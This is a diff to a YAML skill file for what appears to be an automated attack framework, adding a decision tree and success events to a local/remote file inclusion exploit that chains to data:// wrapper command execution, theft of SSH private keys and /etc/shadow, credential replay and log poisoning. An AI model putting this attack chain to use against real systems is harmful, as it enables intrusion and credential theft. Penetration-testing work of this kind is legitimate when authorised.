@@ -2,7 +2,7 @@ skill_id: lfi_rfi_exploit
 name: "本地/远程文件包含 (LFI/RFI)"
 category: web_rce
 phase: foothold
-version: "6.0"
+version: "7.0"
 
 match:
   rules:
@@ -15,6 +15,25 @@ match:
         - "CVE-2021-42013"
     - fingerprint_contains: ["php"]
       evidence_contains: ["include"]
+
+# === 自适应决策树：根据探测结果动态选择路径 ===
+selector:
+  if:
+    - condition: { rfi_confirmed: true }
+      then_path: lfi_wrapper_rce
+    - condition: { ssh_key_found: true }
+      then_path: lfi_cred_reuse
+    - condition: { shadow_readable: true }
+      then_path: lfi_cred_reuse
+    - condition:
+        all_of:
+          - lfi_style: "php_filter"
+      then_path: php_filter_chain
+    - condition:
+        all_of:
+          - variable_not_empty: "lfi_param"
+      then_path: lfi_wrapper_rce
+  default: lfi_sensitive_read
 
 probes:
   - id: detect_lfi
@@ -89,6 +108,14 @@ exploit_paths:
     priority: 1
     conditions:
       lfi_confirmed: true
+    on_success:
+      action: publish_event
+      event:
+        event_type: rce_achieved
+        target_skill_ids: []
+        payload:
+          method: "lfi_wrapper_rce"
+          shell_type: "rce_data_wrapper"
     steps:
       - id: try_data_wrapper
         description: "data:// wrapper 执行系统命令"
@@ -151,6 +178,15 @@ exploit_paths:
     priority: 2
     conditions:
       lfi_confirmed: true
+    on_success:
+      action: publish_event
+      event:
+        event_type: credential_extracted
+        target_skill_ids: ["credential_replay", "credential_bruteforce"]
+        priority: 3
+        payload:
+          source: "lfi_cred_reuse"
+          extract_method: "lfi_file_read"
     steps:
       - id: ssh_key_login
         description: "用 LFI 偷取的 SSH 私钥尝试登录目标"
@@ -181,6 +217,17 @@ exploit_paths:
     priority: 3
     conditions:
       lfi_confirmed: true
+    on_success:
+      action: publish_event
+      event:
+        event_type: file_extracted
+        target_skill_ids: ["log_poisoning", "credential_replay"]
+        priority: 5
+        payload:
+          source: "lfi_sensitive_read"
+          files_read: "{{readable_files_list}}"
+          shadow_readable: "{{shadow_readable}}"
+          ssh_key_found: "{{ssh_key_found}}"
     steps:
       - id: read_passwd_confirm
         description: "验证目录遍历 -- 使用已确认参数和深度/风格读取 /etc/passwd"
